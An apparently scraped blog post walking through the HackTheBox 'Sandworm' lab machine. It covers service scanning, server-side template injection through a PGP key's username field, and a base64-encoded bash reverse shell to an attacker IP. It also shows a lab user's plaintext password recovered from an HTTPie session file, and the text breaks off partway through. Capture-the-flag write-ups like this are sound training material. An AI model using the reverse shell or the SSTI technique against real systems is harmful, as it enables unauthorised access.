/proc/27179/root Warning: cleaning all supplementary groups Child process initialized in 10.03 ms atlas@sandworm:/tmp$ su - root@sandworm:~# cat /root/root.txt 12d54f557************************* root@sandworm:~# Happy Hacking ! 👾​❤️​ References : What is PGP Encryption and How Does It Work? Making and verifying signatures SSTI (Server Side Template Injection) PayloadsAllTheThings/Server Side Template Injection/ SUID Firejail","headline":"HackTheBox-Sandworm Walkthrough","image":"/assets/img/favicons/HackTheBox/Sandworm/Sandworm.png","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/HackTheBox-Sandworm/"},"url":"/posts/HackTheBox-Sandworm/"}</script><title>HackTheBox-Sandworm Walkthrough | Mostafa Toumi</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Mostafa Toumi"><meta name="application-name" content="Mostafa Toumi"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://raw.githubusercontent.com/Mostafatoumi/mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/emsec_1.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Mostafa Toumi</a></div><div class="site-subtitle font-italic">Computer Networking Specialist | Penetration Tester | CTF Player</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/Mostafatoumi" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/EmSec0" aria-label="twitter" target="_blank" rel="noopener noreferrer"> <i class="fa-brands fa-x-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['Mostafatoumi0','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/962022" aria-label="hackthebox" target="_blank" rel="noopener noreferrer"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/mostafatoumi/" aria-label="linkedin" target="_blank" rel="noopener noreferrer"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox-Sandworm Walkthrough</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>HackTheBox-Sandworm Walkthrough</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1700308800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Nov 18, 2023 </em> </span> <span> Updated <em class="" data-ts="1700574511" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Nov 21, 2023 </em> </span><div class="mt-3 mb-3"> <a href="/assets/img/favicons/HackTheBox/Sandworm/Sandworm.png" class="popup img-link preview-img shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1200 630'%3E%3C/svg%3E" data-src="/assets/img/favicons/HackTheBox/Sandworm/Sandworm.png" alt="Preview Image" width="1200" height="630" class="lazyload" data-proofer-ignore></a></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/EmSec0">Mostafa Toumi</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2455 words"> <em>13 min</em> read</span></div></div></div><div class="post-content"><h1 id="description-">Description :</h1><p>Sandworm presents a challenging journey, starting with PGP signatures and SSTI exploration to gain SSH access as ‘silentobserver.’ Uncovered a Rust script running as root, leveraged a firejail vulnerability for privilege escalation, ultimately achieving root access on the Linux machine.</p><h2 id="nmap-"><span class="mr-2">Nmap :</span><a href="#nmap-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p</span> 22,80,443 <span class="nt">-sCV</span> ssa.htb
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-11-17 20:19 GMT
Nmap scan report <span class="k">for </span>ssa.htb <span class="o">(</span>10.10.11.218<span class="o">)</span>
Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http     nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  ssl/http nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSA/organizationName<span class="o">=</span>Secret Spy Agency/stateOrProvinceName<span class="o">=</span>Classified/countryName<span class="o">=</span>SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
|_http-title: Secret Spy Agency | Secret Security Service
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>22.80 seconds

</pre></table></code></div></div><p>from <code class="language-plaintext highlighter-rouge">nmap</code> we have OpenSSH 8.9p1 on Port 22, nginx 1.18.0 on Ports 80 and 443 with SSL certificate for “SSA,”. The site redirect us to http://ssa.htb/</p><h2 id="website-443-"><span class="mr-2">website 443 :</span><a href="#website-443-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This site seems to be the online presence of the Secret Spy Agency (SSA), specializing in cryptology, foreign signals intelligence (SIGINT), and cybersecurity services to enhance national security efforts.</p><p><a href="/assets/img/favicons/HackTheBox/Sandworm/home.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sandworm/home.png" alt="main page" class="lazyload" data-proofer-ignore></a></p><h3 id="dirsearch-"><span class="mr-2">dirsearch :</span><a href="#dirsearch-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre> dirsearch <span class="nt">-u</span> ssa.htb                     
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/_ssa.htb/_23-11-17_19-53-48.txt

Target: https://ssa.htb/

<span class="o">[</span>19:53:48] Starting: 
<span class="o">[</span>19:54:12] 200 -    5KB - /about                                            
<span class="o">[</span>19:54:15] 302 -  227B  - /admin  -&gt;  /login?next<span class="o">=</span>%2Fadmin                  
<span class="o">[</span>19:54:56] 200 -    3KB - /contact                                          
<span class="o">[</span>19:55:20] 200 -    9KB - /guide                                            
<span class="o">[</span>19:55:40] 200 -    4KB - /login                                            
<span class="o">[</span>19:55:41] 302 -  229B  - /logout  -&gt;  /login?next<span class="o">=</span>%2Flogout                
                                                                             
Task Completed

</pre></table></code></div></div><p>checking login page , but it seems nothing to do here</p><p><a href="/assets/img/favicons/HackTheBox/Sandworm/login.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sandworm/login.png" alt="Login" class="lazyload" data-proofer-ignore></a></p><p>The notice indicates that the site is powered by Flask, which means this site is using flask framework. Let’s keep that in mind.</p><p><a href="/assets/img/favicons/HackTheBox/Sandworm/flask.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sandworm/flask.png" alt="flask" class="lazyload" data-proofer-ignore></a></p><p>The contact page showcases a form for submitting encrypted tips. It seems nothing interesting; let’s move on to the guide page</p><p><a href="/assets/img/favicons/HackTheBox/Sandworm/contact.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sandworm/contact.png" alt="contact" class="lazyload" data-proofer-ignore></a></p><p>Secret Spy Agency’s site appears to provide interactive exercises for PGP encryption/decryption, emphasizing secure communication practices</p><p><a href="/assets/img/favicons/HackTheBox/Sandworm/guide.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sandworm/guide.png" alt="Alt text" class="lazyload" data-proofer-ignore></a></p><h2 id="pgp-pretty-good-privacy-"><span class="mr-2">PGP (Pretty Good Privacy) :</span><a href="#pgp-pretty-good-privacy-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><span style="color:red">Background</span> :</ul><p><em>Pretty Good Privacy (PGP) is a robust encryption protocol that employs a combination of symmetric-key and public-key cryptography for secure message communication. In the encryption process, a random symmetric key is generated for message content, which is then encrypted using the recipient’s public key. Upon receiving the encrypted message, the recipient uses their private key to decrypt the symmetric key, enabling subsequent decryption of the actual message content. PGP ensures end-to-end security, user authentication, and message integrity, making it a widely adopted solution for secure electronic communication</em></p><p><a href="/assets/img/favicons/HackTheBox/Sandworm/how-does-pgp-encryption-work.webp" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sandworm/how-does-pgp-encryption-work.webp" alt="alt text" class="lazyload" data-proofer-ignore></a></p><h1 id="shell-as-atlas">Shell as atlas</h1><h2 id="identify-ssti-server-side-template-injection"><span class="mr-2">Identify SSTI (Server Side Template Injection)</span><a href="#identify-ssti-server-side-template-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We are moving to the ‘Verify Signature’ section, generating a PGP public key and PGP signed message. This can be done using a PGP tool that is already available on Debian distribution <a href="/assets/img/favicons/HackTheBox/Sandworm/verify_signature.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sandworm/verify_signature.png" alt="verify nignature" class="lazyload" data-proofer-ignore></a></p><h3 id="generate-pgp-public-and-private-keys"><span class="mr-2">generate pgp public and private keys:</span><a href="#generate-pgp-public-and-private-keys" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿emsec<span class="o">)</span>-[~emsec/hackthebox/sandworm]
└─# gpg <span class="nt">--gen-key</span>
gpg <span class="o">(</span>GnuPG<span class="o">)</span> 2.2.40<span class="p">;</span> Copyright <span class="o">(</span>C<span class="o">)</span> 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use <span class="s2">"gpg --full-generate-key"</span> <span class="k">for </span>a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: emsec
Email address: emsec@emsec.com
You selected this USER-ID:
    <span class="s2">"emsec &lt;emsec@emsec.com&gt;"</span>

Change <span class="o">(</span>N<span class="o">)</span>ame, <span class="o">(</span>E<span class="o">)</span>mail, or <span class="o">(</span>O<span class="o">)</span>kay/<span class="o">(</span>Q<span class="o">)</span>uit? o
We need to generate a lot of random bytes. It is a good idea to perform
some other action <span class="o">(</span><span class="nb">type </span>on the keyboard, move the mouse, utilize the
disks<span class="o">)</span> during the prime generation<span class="p">;</span> this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action <span class="o">(</span><span class="nb">type </span>on the keyboard, move the mouse, utilize the
disks<span class="o">)</span> during the prime generation<span class="p">;</span> this gives the random number
generator a better chance to gain enough entropy.
gpg: revocation certificate stored as <span class="s1">'/root/.gnupg/openpgp-revocs.d/C98C59FAEFAD2A327A70709AAD5FD26F46AE1182.rev'</span>
public and secret key created and signed.

pub   rsa3072 2023-11-17 <span class="o">[</span>SC] <span class="o">[</span>expires: 2025-11-16]
      C98C59FAEFAD2A327A70709AAD5FD26F46AE1182
uid                      emsec &lt;emsec@emsec.com&gt;
sub   rsa3072 2023-11-17 <span class="o">[</span>E] <span class="o">[</span>expires: 2025-11-16]

</pre></table></code></div></div><p>Find the pgp public key we just created :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿emsec<span class="o">)</span>-[~emsec/hackthebox/sandworm]
└─# gpg <span class="nt">--verbose</span> <span class="nt">--armor</span> <span class="nt">--export</span> emsec 
gpg: writing to stdout
<span class="nt">-----BEGIN</span> PGP PUBLIC KEY BLOCK-----

mQGNBGVX8hoBDADhzt0lyX/MRpz5qiuQwdr6AR9U+KgHIlbZ2dwHyhBASe9dYr1X
fvFAt/YBrmFKu7X5KGeh6HIQckLhhJcFZ+J37FDcr521Uhfn1tHcNpv8HmURuXVT
G1x824bjnEjh/mNv3yszAGMmsTKoU9Pfh7S/KexdepuRVo5VyPZFjDtToClvGmFA
RTdY0OgIiocm+FMMPDNTTNmXICfYXNcjLPwYFfYrEdZZD76UDVvQNjF2yz2N1YsK
<span class="nt">-----------------------</span>&lt;snippet key&gt;----------------------------
1KQsPHtXFl5nAaki2LAAAF6FL7jfKJ/PHnMq/rFiCwFlDh+zRCCg2yeKnqt8TpcH
5wMVN/EyMmNleI68AonFepIDWXB28U0p/Pstff2TVkqvOLlCB+svpOxnJLgqfwus
u1d6LQ85ObGfKyX+RVWXtNWBuYzpXzw6foFI7l197MQ28aWabFdez1GA3SZ9jTab
9eRUTJbTYMNVmpj0FLZrWemSCowFhV0xFq5jcWz0yG9hnmq9fDor5bAdLBRQ3J05
F3MZanTAkQCjZ3ZyyPc294yBcWitytsE/jMlvslxIPtz4IAQWPQdl33Hk+YVlOIK
MDkH5NEqU+1Cv72TiQA/JH/wdBgVCcvJT+i4QeHpXeJGBBrUyOourbxN49ZUdegC
x/VT3u7XAwzYvjLtnZuZb+jH4WSqWTxFBDXz9Q5y
<span class="o">=</span>I2R6
<span class="nt">-----END</span> PGP PUBLIC KEY BLOCK-----
</pre></table></code></div></div><h3 id="generate-pgp-signed-message-"><span class="mr-2">Generate pgp signed message :</span><a href="#generate-pgp-signed-message-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Create a file called ‘test’ containing any text. Next, to create a PGP signed message, we will sign this file ‘test’ with our PGP public key using the command:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿emsec<span class="o">)</span>-[~emsec/hackthebox/sandworm]
└─# <span class="nb">touch </span>test_file

┌──<span class="o">(</span>root㉿emsec<span class="o">)</span>-[~emsec/hackthebox/sandworm]
└─# <span class="nb">echo</span> <span class="s2">"This is emsec"</span> <span class="o">&gt;</span> test_file                           
                                                                                       
┌──<span class="o">(</span>root㉿emsec<span class="o">)</span>-[~emsec/hackthebox/sandworm]
└─# gpg <span class="nt">--verbose</span> <span class="nt">-u</span> emsec <span class="nt">--clear-sign</span> test_file 
gpg: writing to <span class="s1">'test_file.asc'</span>
gpg: pinentry launched <span class="o">(</span>137563 gnome3:curses 1.2.1 /dev/pts/3 xterm-256color :0.0 20600/0/5 0/0 -<span class="o">)</span>
gpg: RSA/SHA512 signature from: <span class="s2">"8FF1A1B62986214E emsec &lt;emsec@emsec.com&gt;"</span>


┌──<span class="o">(</span>root㉿emsec<span class="o">)</span>-[~emsec/hackthebox/sandworm]
└─# <span class="nb">cat </span>test_file.asc
<span class="nt">-----BEGIN</span> PGP SIGNED MESSAGE-----
Hash: SHA512

This is emsec
<span class="nt">-----BEGIN</span> PGP SIGNATURE-----

iQHEBAEBCgAuFiEE5nPSS1qEnKUqTXuNj/GhtimGIU4FAmVX/u8QHGVtc2VjQGVt
c2VjLmNvbQAKCRCP8aG2KYYhTqkvDADL+dxWozCGyFv5j0SPR/jZxts8Wzn52cfj
8Khrqsod1xy534K+mWmadv1Un7W70z+DEki6GPuK7bNDGvGPUmuyHzSCGPqUZhl0
0elQDmpc5uDOsVFVfjm+0zk/O34V/YKm6KhSIKNKRkuGgaUI38u/xA0KgHgCs3xW
nr1y3PzZ1owdcLFCzeUTpKJKcFgCcSXZSdixC3K7oaiAN2CAF4PBs6RAgMZ0hny5
JNDhUaPEWCIafA7ZFvqE6aKWAesXyUIuMHxGLZ/EcsyleMfuhKsgyQYYusOzbk0H
61NzJjTGDWG4G1cn0eWot51w9gcMPO37ZWyYrMpJXgWpZhG4O76BpytEnLWZaix4
iYJHXWgFtZm0FPJso+ji7hhTa4eyu9Bvhq/r2SVAk4NTvD2INQBipn2CghpYzlu0
/c2fmqmxrUT0W0E86Q/uJXMMn99AZxQSr947Ye/3id0JkRkTnO3z8omdvf9kUIr6
koQWgRor6npAHtqQA/5+LRoubvdY6HM<span class="o">=</span>
<span class="o">=</span>OXZm
<span class="nt">-----END</span> PGP SIGNATURE-----
</pre></table></code></div></div><p>Now let’s go back to <code class="language-plaintext highlighter-rouge">/guide</code> and enter the GPG public key and signed text that we just generated.</p><p>Great! Our signature is valid, but more importantly, we see it reflects our username <code class="language-plaintext highlighter-rouge">emsec</code> in the message. This is a good sign because we can manipulate this name to reflect our input. Let’s try SSTI payloads.</p><p><a href="/assets/img/favicons/HackTheBox/Sandworm/result.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sandworm/result.png" alt="signature result" class="lazyload" data-proofer-ignore></a></p><h3 id="find"><span class="mr-2">Find</span><a href="#find" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We generate the PGP public key and PGP signed message in the same way as before. By including the ssti codes, we successfully load the payload for SSTI.</p><p><a href="/assets/img/favicons/HackTheBox/Sandworm/ssti_1.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sandworm/ssti_1.png" alt="output of ssti" class="lazyload" data-proofer-ignore></a></p><ul><li>SSTI diagram from Hacktricks</ul><p><a href="/assets/img/favicons/HackTheBox/Sandworm/ssti_2.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sandworm/ssti_2.png" alt="ssti" class="lazyload" data-proofer-ignore></a></p><p>Now we will do the same thing of modifying the username, generating the key, etc., to get RCE and have a rev shell</p><p>The reason we base64 the reverse shell is that certain characters are not allowed for the username in PGP keys</p><ul><li>encode the shell to base64</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>echo "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.173/4444 0&gt;&amp;1'" | base64
</pre></table></code></div></div><ul><li>The finall payload :</ul><p><a href="/assets/img/favicons/HackTheBox/Sandworm/ssti_payload.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sandworm/ssti_payload.png" alt="ssti payload" class="lazyload" data-proofer-ignore></a></p><h2 id="atlas--silentobserver"><span class="mr-2">atlas –&gt; silentobserver</span><a href="#atlas--silentobserver" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-"><span class="mr-2">Enumeration :</span><a href="#enumeration-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>I tried to add my public SSH key to the Atlass user, but I got a <code class="language-plaintext highlighter-rouge">Read-only file system</code> error.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>atlas@sandworm:~/.ssh<span class="nv">$ </span><span class="nb">ls
</span>authorized_keys
atlas@sandworm:~/.ssh<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrvOsMQHqYKD7JfCOM4HExbn1Xd4thzE8owKTZzvRry1aaLSi3EumO9pLySC2h9ItTTWlMl1zGl68lzwRbrxgeVbNzw423T/Hzou+RqjsMzbSdvf&lt;snippet&gt;MH0vXHfDoUe5FZbUwZ+S4rgVhwYOniT6ecBWUouwn5C/gb/N85ym2taZTX+2wQNL723s+fdIBtsW3GK5/0vLSuKPxBEa9xkErNuC46oS/1sGsz0k32ZwG+5magDf8YGxlanefgli+09FdCtu8gHJd+T4cmgNYQZ1dA7emysCvNgVC7TSqcfBEGM= root@emsec"</span> <span class="o">&gt;&gt;</span> authorized_keys
&lt;<span class="nv">mysCvNgVC7TSqcfBEGM</span><span class="o">=</span> root@emsec<span class="s2">" &gt;&gt; authorized_keys
bash: authorized_keys: Read-only file system
</span></pre></table></code></div></div><p>If we try several commands like <code class="language-plaintext highlighter-rouge">whoami</code> and <code class="language-plaintext highlighter-rouge">sudo -l</code>, we will see that they are not found, which left me a little confused.</p><p>If we go to the <code class="language-plaintext highlighter-rouge">atlas</code> user directories, we will be able to see that there is a <code class="language-plaintext highlighter-rouge">.config</code> directory.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>atlas@sandworm:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="nb">ls</span> <span class="nt">-la</span>
total 52
drwxr-xr-x 8 atlas  atlas   4096 Nov 17 16:06 <span class="nb">.</span>
drwxr-xr-x 4 nobody nogroup 4096 May  4  2023 ..
lrwxrwxrwx 1 nobody nogroup    9 Nov 22  2022 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 atlas  atlas    220 Nov 22  2022 .bash_logout
<span class="nt">-rw-r--r--</span> 1 atlas  atlas   3771 Nov 22  2022 .bashrc
drwxrwxr-x 2 atlas  atlas   4096 Jun  6 08:49 .cache
drwxrwxr-x 3 atlas  atlas   4096 Feb  7  2023 .cargo
drwxrwxr-x 4 atlas  atlas   4096 Jan 15  2023 .config
<span class="nt">-rwxrwxrwx</span> 1 atlas  atlas   7955 Nov 17 16:06 exploit.py
drwx------ 4 atlas  atlas   4096 Nov 18 02:00 .gnupg
drwxrwxr-x 6 atlas  atlas   4096 Feb  6  2023 .local
<span class="nt">-rw-r--r--</span> 1 atlas  atlas    807 Nov 22  2022 .profile
drwx------ 2 atlas  atlas   4096 Nov 17 16:12 .ssh
atlas@sandworm:~<span class="nv">$ </span><span class="nb">cd</span> .config
<span class="nb">cd</span> .config
atlas@sandworm:~/.config<span class="nv">$ </span><span class="nb">ls
ls
</span>firejail
httpie
</pre></table></code></div></div><p>/home/atlas/.config has Firejail and HTTPie. Firejail is a sandbox program designed to prevent security breaches by restricting the environment. Going further, in /home/atlas/.config/httpie/sessions/localhost_5000/admin.json, we have the following:</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"__meta__"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"about"</span><span class="p">:</span><span class="w"> </span><span class="s2">"HTTPie session file"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"help"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://httpie.io/docs#sessions"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"httpie"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2.6.0"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"auth"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"quietLiketheWind22"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
